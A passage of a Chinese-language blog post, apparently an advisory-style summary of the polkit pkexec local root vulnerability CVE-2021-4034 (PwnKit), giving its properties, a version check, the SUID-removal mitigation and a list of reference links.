<li>pkexec 默认安装在所有主要的 Linux 发行版上（我们利用了 Ubuntu、Debian、Fedora、CentOS，而其他发行版也可能利用）</li>
<li>pkexec 自 2009 年 5 月创建以来就存在漏洞（commit c8c3d83, &ldquo;Add a pkexec(1) command&rdquo;）</li>
<li>任何没有特权的本地用户都可以利用这个漏洞来获得完全的 root 权限。</li>
<li>虽然这个漏洞在技术上是一个内存损坏，但它可即时、可靠地、以独立于架构的方式加以利用。</li>
<li>即使 polkit 守护进程本身没有运行，也可以利用。</li>
</ul>
</blockquote>
<h2 id="0x04-漏洞补丁">0x04 漏洞补丁</h2>
<h3 id="a-如何检测该漏洞">a. 如何检测该漏洞</h3>
<p>检查组件版本：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">➜ pkexec --version
</span></span><span class="line"><span class="cl">pkexec version 0.105
</span></span></code></pre></div><h3 id="b-如何防御该漏洞">b. 如何防御该漏洞</h3>
<p>及时升级组件</p>
<h3 id="c-有没有哪种通用的缓解措施可以阻断该漏洞">c. 有没有哪种通用的缓解措施可以阻断该漏洞</h3>
<p>Qualys 在 <a href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt" target="_blank" rel="noopener noreffer">报告</a> 中给出了缓解措施：</p>
<pre tabindex="0"><code># chmod 0755 /usr/bin/pkexec
</code></pre><p>即从 pkexec 中删除 SUID 位</p>
<p>RedHat 给出了针对该漏洞的缓解措施：</p>
<blockquote>
<p><a href="https://access.redhat.com/security/vulnerabilities/RHSB-2022-001" target="_blank" rel="noopener noreffer">https://access.redhat.com/security/vulnerabilities/RHSB-2022-001</a></p>
</blockquote>
<h2 id="0x05-参考">0x05 参考</h2>
<ol>
<li><a href="https://mp.weixin.qq.com/s/3rnkcRfX_BxzlVzp0stQRw" target="_blank" rel="noopener noreffer">CVE-2021-4034 pkexec 本地提权 - 非尝咸鱼贩 [2022-01-26]</a></li>
<li><a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034" target="_blank" rel="noopener noreffer">PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034) | Qualys Security Blog</a></li>
<li><a href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt" target="_blank" rel="noopener noreffer">https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt</a></li>
<li>演示视频：<a href="https://vimeo.com/669715589" target="_blank" rel="noopener noreffer">PwnKit Vulnerability on Vimeo</a></li>
<li>Commit：<a href="https://gitlab.freedesktop.org/polkit/polkit/-/commit/a2bf5c9c83b6ae46cbd5c779d3055bff81ded683" target="_blank" rel="noopener noreffer">pkexec: local privilege escalation (CVE-2021-4034) (a2bf5c9c) · Commits · polkit / polkit · GitLab</a></li>
<li>POC：<a href="https://github.com/arthepsy/CVE-2021-4034" target="_blank" rel="noopener noreffer">arthepsy/CVE-2021-4034: PoC for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034)</a></li>
<li><a href="https://www.openwall.com/lists/oss-security/2022/01/25/11" target="_blank" rel="noopener noreffer">oss-security - pwnkit: Local Privilege Escalation in polkit&rsquo;s pkexec (CVE-2021-4034)</a></li>
<li><a href="https://cert.360.cn/warning/detail?id=25d7a6ec96c91ca4e4238fd10da2c778" target="_blank" rel="noopener noreffer">CVE-2021-4034:Linux Polkit 权限提升漏洞通告 - 360CERT [2022-01-26]</a></li>
</ol>
<h3 id="更早的相关研究">更早的相关研究</h3>
<ul>
<li><a href="https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/" target="_blank" rel="noopener noreffer">Privilege escalation with polkit: How to get root on Linux with a seven-year-old bug | The GitHub Blog [2021-06-10]</a></li>
<li><a href="https://ryiron.wordpress.com/2013/12/16/argv-silliness/" target="_blank" rel="noopener noreffer">argv silliness | ~ryiron [2013-12-16]</a></li>
<li><a href="https://www.exploit-db.com/exploits/17942" target="_blank" rel="noopener noreffer">pkexec - Race Condition Privilege Escalation (CVE-2011-1485)  - Linux local Exploit [2011-10-08]</a></li>
<li><a href="https://www.openwall.com/lists/oss-security/2014/07/14/1" target="_blank" rel="noopener noreffer">glibc locale issues - Tavis Ormandy [2014-07-14]</a></li>
<li><a href="https://www.openwall.com/lists/oss-security/2017/06/23/8" target="_blank" rel="noopener noreffer">charset.alias in pkexec/glib/gnulib (was: glibc locale issues) - Jakub Wilk [2017-06-23]</a></li>
<li><a href="https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/" target="_blank" rel="noopener noreffer">Getting Arbitrary Code Execution from fopen&rsquo;s 2nd Argument | The Pwnbroker [2019-11-04]</a></li>
<li><a href="https://www.slideshare.net/SilvioCesare/simple-bugs-and-vulnerabilities-in-linux-distributions" target="_blank" rel="noopener noreffer">Simple Bugs and Vulnerabilities in Linux Distributions - Silvio Cesare [2011-03-25]</a></li>
</ul>
</div></div></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.93.2">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="rome2020.github.io/" target="_blank"></a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
                <i class="fas fa-arrow-up fa-fw"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
                <i class="fas fa-comment fa-fw"></i>
            </a>
        </div><script type="text/javascript" src="/rome2020.github.io/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/rome2020.github.io/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/rome2020.github.io/lib/clipboard/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{}};</script><script type="text/javascript" src="/rome2020.github.io/js/theme.min.js"></script></body>
</html>
